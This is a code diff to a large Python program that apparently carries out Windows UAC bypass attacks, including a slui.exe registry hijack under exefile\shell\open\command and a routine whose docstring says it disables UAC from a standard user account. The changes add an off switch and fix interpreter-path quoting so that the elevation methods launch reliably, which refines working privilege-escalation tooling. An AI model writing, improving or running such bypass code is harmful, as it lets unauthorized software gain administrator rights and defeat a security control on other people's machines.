@@ -9,6 +9,7 @@ import os
 
 # Debug flag for UAC and privilege operations
 UAC_DEBUG = True  # Set to True to see detailed UAC/privilege debugging
+DISABLE_UAC_BYPASS = False  # Set to True to skip all UAC bypass attempts (avoids popups)
 
 def debug_print(msg):
     """Print debug messages directly (bypasses all logging systems)"""
@@ -1439,8 +1440,9 @@ class UACBypassMethod:
         """Get the current executable path for elevation"""
         current_exe = os.path.abspath(__file__)
         if current_exe.endswith('.py'):
-            return f'python.exe "{current_exe}"'
-        return current_exe
+            # Use sys.executable to get FULL path to Python interpreter
+            return f'"{sys.executable}" "{current_exe}"'
+        return f'"{current_exe}"'
     
     def cleanup_registry(self, key_path: str, hive=None) -> None:
         """Clean up registry entries with proper error handling"""
@@ -1532,6 +1534,12 @@ class UACBypassManager:
     
     def try_all_methods(self) -> bool:
         """Try all available UAC bypass methods until one succeeds"""
+        # Check if UAC bypass is globally disabled
+        if DISABLE_UAC_BYPASS:
+            debug_print("⚠️ [UAC MANAGER] UAC bypass is DISABLED (DISABLE_UAC_BYPASS=True)")
+            log_message("[UAC MANAGER] UAC bypass disabled by configuration", "info")
+            return False
+        
         with self._lock:
             available_methods = self.get_available_methods()
             
@@ -2684,7 +2692,10 @@ def bypass_uac_slui_hijack():
         
         current_exe = os.path.abspath(__file__)
         if current_exe.endswith('.py'):
-            current_exe = f'python.exe "{current_exe}"'
+            # Use sys.executable for full path to Python interpreter
+            current_exe = f'"{sys.executable}" "{current_exe}"'
+        else:
+            current_exe = f'"{current_exe}"'
         
         # Hijack slui.exe through registry
         key_path = r"Software\Classes\exefile\shell\open\command"
@@ -5077,6 +5088,12 @@ def bootstrap_uac_disable_no_admin():
     
     This works from a STANDARD USER account!
     """
+    # Check if UAC bypass is globally disabled
+    if DISABLE_UAC_BYPASS:
+        debug_print("⚠️ [BOOTSTRAP] UAC bypass is DISABLED (DISABLE_UAC_BYPASS=True)")
+        debug_print("⚠️ [BOOTSTRAP] Skipping UAC bypass attempts")
+        return False
+    
     if not WINDOWS_AVAILABLE:
         debug_print("[BOOTSTRAP] Not Windows - skipping")
         return False
